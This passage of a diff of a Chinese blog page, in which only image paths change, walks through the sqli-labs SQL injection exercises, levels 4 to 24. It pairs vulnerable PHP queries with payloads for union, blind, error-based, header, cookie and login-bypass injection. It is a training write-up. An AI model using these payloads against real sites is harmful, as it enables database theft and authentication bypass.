 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>id=1”) and 1=2 union select 1,database(),user() –+</p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906194955582.png" alt="image-20220906194955582"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906194955582.png" alt="image-20220906194955582"></p>
 <h1 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h1><p>单引号闭合</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
@@ -383,25 +383,25 @@
 <p><code>id=5&#39; and substr((select database()),1,1)=&#39;s&#39; --+</code></p>
 <p>substr（）函数是用来分隔字符串的</p>
 <p>也就是判断数据库第一个字母是不是s的意思</p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906195916896.png" alt="image-20220906195916896"></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906195924510.png" alt="image-20220906195924510"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906195916896.png" alt="image-20220906195916896"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906195924510.png" alt="image-20220906195924510"></p>
 <h1 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>闭合双引号的布尔盲注</p>
 <p><code>id=5&quot; and substr((select database()),1,1)=&#39;s&#39; --+</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906200049406.png" alt="image-20220906200049406"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906200049406.png" alt="image-20220906200049406"></p>
 <h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>文件没写进去，用的布尔盲注</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=5&#x27;)) and substr((select database()),1,1)=&#x27;s&#x27; --+</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907123403037.png" alt="image-20220907123403037"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907123403037.png" alt="image-20220907123403037"></p>
 <h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>闭合单引号的布尔盲注</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=5&#x27; and substr((select database()),1,1)=&#x27;r&#x27; --+</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907123825007.png" alt="image-20220907123825007"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907123825007.png" alt="image-20220907123825007"></p>
 <h1 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h1><p>纯不报错，用sleep盲注</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">	<span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">    &#125;<span class="comment">//输入什么都是输出u are in...</span></span><br></pre></td></tr></table></figure>
 
@@ -419,37 +419,37 @@
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=123&#x27;order by 2 --+&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname=123&amp;passwd=123&#x27;union select database(),3 --+&amp;submit=Submit</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907125936343.png" alt="image-20220907125936343"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907125936343.png" alt="image-20220907125936343"></p>
 <h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>闭合双引号和括号的post注入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1&amp;passwd=-1&quot;) union select 1,database() --+&amp;submit=Submit</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907130550018.png" alt="image-20220907130550018"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907130550018.png" alt="image-20220907130550018"></p>
 <h1 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h1><p>用万能密码登录</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">	<span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">	<span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="subst">$uname</span>&#x27;) and password=(&#x27;<span class="subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1&amp;passwd=-1&#x27;) or 1=1 --+&amp;submit=Submit</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907132748740.png" alt="image-20220907132748740"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907132748740.png" alt="image-20220907132748740"></p>
 <h1 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>闭合双引号的万能密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1&amp;passwd=-1&quot; or 1=1 --+&amp;submit=Submit</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907132919741.png" alt="image-20220907132919741"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907132919741.png" alt="image-20220907132919741"></p>
 <h1 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>闭合单引号的万能密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1&amp;passwd=-1&#x27; or 1=1 --+&amp;submit=Submit</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907133135237.png" alt="image-20220907133135237"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907133135237.png" alt="image-20220907133135237"></p>
 <h1 id="less16"><a href="#less16" class="headerlink" title="less16"></a>less16</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   <span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>闭合双引号和括号的万能密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1&amp;passwd=-1&quot;) or 1=1 --+&amp;submit=Submit</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907133338525.png" alt="image-20220907133338525"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907133338525.png" alt="image-20220907133338525"></p>
 <h1 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h1><p>从这关开始有过滤函数了</p>
 <p>感觉又有以前玩ctf的感觉了。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
@@ -463,7 +463,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=231&#x27; and (extractvalue(1,concat(0x5c,database(),0x5c))) --+ &amp;submit=Submit</span><br></pre></td></tr></table></figure>
 
 <p>爆出数据库</p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907150720242.png" alt="image-20220907150720242"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907150720242.png" alt="image-20220907150720242"></p>
 <h1 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">这次给账号密码都弄上了过滤函数。</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">但是在下面的代码中insert了我们的uagent ip 和username</span><br><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line">mysql_query(<span class="variable">$insert</span>);</span><br><span class="line">所以我们这里可以使用报错注入。</span><br></pre></td></tr></table></figure>
@@ -471,20 +471,20 @@
 <p>由于我们之前前面那些关卡就获得了账号密码了，就不需要在账号密码上下功夫了。insert注意参数数量要一样，3个。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 1&#x27;,2,(extractvalue(1,concat(0x5c,database(),0x5c)))) #</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907152538501.png" alt="image-20220907152538501"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907152538501.png" alt="image-20220907152538501"></p>
 <h1 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>;</span><br><span class="line">mysql_query(<span class="variable">$insert</span>);</span><br></pre></td></tr></table></figure>
 
 <p>这次是referer注入</p>
 <p>同样的还是使用报错注入，因为下面有报错语句。注意这次的参数只有两个。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&#x27;,(extractvalue(1,concat(0x5c,database(),0x5c)))) #</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907152850658.png" alt="image-20220907152850658"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907152850658.png" alt="image-20220907152850658"></p>
 <h1 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h1><p>一个cookie注入</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>]</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>也就是在cookie中的uname来注入</p>
 <p>同样有报错语句，试一下报错注入。</p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907153949462.png" alt="image-20220907153949462"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907153949462.png" alt="image-20220907153949462"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) union select (extractvalue(1,concat(0x5c,database(),0x5c))),2,3 --+</span><br></pre></td></tr></table></figure>
 
 <h1 id="less21"><a href="#less21" class="headerlink" title="less21"></a>less21</h1><p>解密base64闭合单引号括号的cookie注入</p>
@@ -493,11 +493,11 @@
 <p>我们就besa64编码一下，然后看到有报错代码，同样使用报错注入。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) union select (extractvalue(1,concat(0x5c,database(),0x5c))),2,3 #</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907155042842.png" alt="image-20220907155042842"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907155042842.png" alt="image-20220907155042842"></p>
 <h1 id="less22"><a href="#less22" class="headerlink" title="less22"></a>less22</h1><p>解密需要闭合双引号的cookie报错注入</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line">setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), time()+<span class="number">3600</span>);	</span><br><span class="line"><span class="variable">$cookee1</span> = <span class="string">&#x27;&quot;&#x27;</span>. <span class="variable">$cookee</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=<span class="subst">$cookee1</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907155623937.png" alt="image-20220907155623937"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907155623937.png" alt="image-20220907155623937"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; union select (extractvalue(1,concat(0x5c,database(),0x5c))),2 #</span><br></pre></td></tr></table></figure>
 
 <h1 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h1><p>这一关不一样了，过滤了我们的注释符号</p>
@@ -506,7 +506,7 @@
 <p>但是我们可以使用union联合注入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 &#x27;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907161043069.png" alt="image-20220907161043069"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907161043069.png" alt="image-20220907161043069"></p>
 <p>其中的group_concat用于连接表名字段</p>
 <h1 id="less24-二次注入"><a href="#less24-二次注入" class="headerlink" title="less24-二次注入"></a>less24-二次注入</h1><p>这是一个二次注入，如下，在注册的时候是对所有参数进行了转义的，但是存入数据库的时候是没有进行转义的，而且在最后更新密码的地方是没有对参数进行转义的，所以造成了二次注入。</p>
